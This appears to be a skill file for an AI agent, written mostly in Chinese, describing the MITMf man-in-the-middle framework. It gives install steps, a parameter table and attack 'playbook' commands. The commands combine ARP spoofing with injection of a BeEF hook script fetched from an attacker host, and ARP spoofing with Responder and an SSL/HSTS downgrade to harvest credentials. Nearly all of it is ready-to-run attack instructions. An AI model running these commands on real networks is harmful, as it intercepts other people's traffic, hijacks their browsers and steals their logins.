---
name: mitmf-mitm
description: "MITMf: ARP spoofing plus JS injection and credential harvesting. Signals: man-in-the-middle, MITM, SSL downgrade, integrated Responder."
zh-signals: "MITMf: ARP 欺骗+JS 注入、欺骗+凭据收割。信号:中间人,mitm,SSL 降级,集成 Responder。"
---

# MITMf

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/byt3bl33d3r/MITMf
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/byt3bl33d3r/MITMf && cd MITMf && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1` | ARP 欺骗 |
| `--hsts` | SSL 降级 |
| `--inject --js-url http://x.com/hook.js` | JS 注入 |
| `--responder` | 集成 Responder |
| `--log` | 见上游文档 |
| `记录` | 见上游文档 |

## 攻击场景 Playbook

### ARP 欺骗+JS 注入

```bash
python mitmf.py -i eth0 --spoof --arp --gateway 10.0.0.1 --inject --js-url http://10.8.0.2:3000/hook.js
# 目标流量全过攻击机,BeEF hook 自动注入
```

### 欺骗+凭据收割

```bash
python mitmf.py --spoof --arp --gateway 10.0.0.1 --responder --hsts
```

## 注意事项

模块化 MITM 框架;JS 注入配 BeEF 是 XSS 被动化打法。
